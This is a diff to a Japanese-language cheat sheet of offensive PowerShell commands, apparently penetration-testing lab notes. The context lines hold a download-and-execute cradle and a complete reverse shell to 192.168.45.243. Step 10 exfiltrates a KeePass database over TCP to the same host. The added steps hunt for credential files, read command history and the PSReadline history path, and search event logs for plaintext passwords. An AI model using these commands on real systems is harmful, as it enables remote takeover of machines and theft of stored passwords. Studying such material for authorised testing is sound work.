@@ -55,7 +55,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-10. Kali側でncを使ってデータをレシーブ状態にさせて、データをPowershell側から送信する。確認済み
+10. Kali側でncを使ってデータをレシーブ状態にさせて、データをPowershell側から送信する。動作検証済み
 ```
 $content = Get-Content 'Database.kdbx' -Raw
 $socket = New-Object System.Net.Sockets.TcpClient('192.168.45.243', 9999)
@@ -95,4 +95,24 @@ Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
 16. 実行中のアプリケーションを一覧表示する
 ```
 Get-Process
+```
+
+17. 認証情報が置かれてそうなファイルをすべて列挙
+```
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+18. 過去に実行されたコマンドのリストを取得する
+```
+Get-History
+```
+
+19. PSReadlineモジュールからPowerShellの実行履歴を取得したファイルパスを出力する(PSReadlineというモジュールによってコマンド履歴が記録されるが、これはClear-Historyコマンドでは削除されない)
+```
+(Get-PSReadlineOption).HistorySavePath
+```
+
+19. passというキーワードで、windows上のイベントビューアから平文のパスワードがPowerShell経由で実行されていないか、スクリプトブロックログを検索する
+```
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -match "pass" }
 ```
